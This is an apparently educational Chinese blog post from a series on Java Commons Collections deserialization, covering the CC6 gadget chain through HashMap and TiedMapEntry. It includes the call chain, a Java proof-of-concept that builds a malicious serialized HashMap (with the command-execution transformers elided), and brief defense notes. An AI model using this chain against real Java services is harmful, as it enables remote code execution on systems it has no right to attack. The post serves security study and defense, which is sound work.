---
title: "Java CC · CC6：HashMap 与 TiedMapEntry"
series: java-cc-deserialization
series_order: 7
date: 2026-04-25 11:20:00 +0800
categories:
  - javaCC
---
# CC6

CC6 被称为“通杀”链，因为它利用了 `HashMap` 作为入口。`HashMap` 是 Java 中最基础的数据结构之一，其 `readObject` 调用 `hash()` 进而调用 `hashCode()` 的逻辑是其核心功能，几乎不可能被修改，否则将破坏 Java 的兼容性。

### 核心原理
利用 `TiedMapEntry` 的 `hashCode()` 方法，该方法同样会调用 `getValue()` 触发 `LazyMap.get()`。

**调用链：**
```text
HashMap.readObject()
  → hash(key)
    → key.hashCode()
      → TiedMapEntry.hashCode()
        → TiedMapEntry.getValue()
          → LazyMap.get()
            → factory.transform()
```

### 完整 POC
构造时需要注意，`HashMap.put` 会触发一次 `hashCode`，导致 `LazyMap` 中缓存了 key，反序列化时就不会再触发 `transform`。因此需要 `remove` 掉这个 key。

```java
package com.nk7;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections6 {
    public static void main(String[] args) throws Exception {
        Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)};
        Transformer[] realTransformers = new Transformer[]{
            // ... 同 CC1 执行链
        };
        Transformer transformerChain = new ChainedTransformer(fakeTransformers);

        Map innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry tme = new TiedMapEntry(outerMap, "nk7");

        Map evilMap = new HashMap();
        evilMap.put(tme, "nk7b"); // put 时会触发 hashCode

        // 关键：清理缓存，确保反序列化时再次触发
        outerMap.remove("nk7");

        // 替换真链
        Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
        f.setAccessible(true);
        f.set(transformerChain, realTransformers);

        serialize(evilMap);
        unserialize("ser.bin");
    }
}
```

### 绕过与防护分析
CC6 利用 `HashMap` 这一基础类，使得在 JDK 层面进行修补变得极其困难。防御重点落在了依赖库层面（如禁用 `InvokerTransformer`）和运行时层面（如序列化过滤器）。
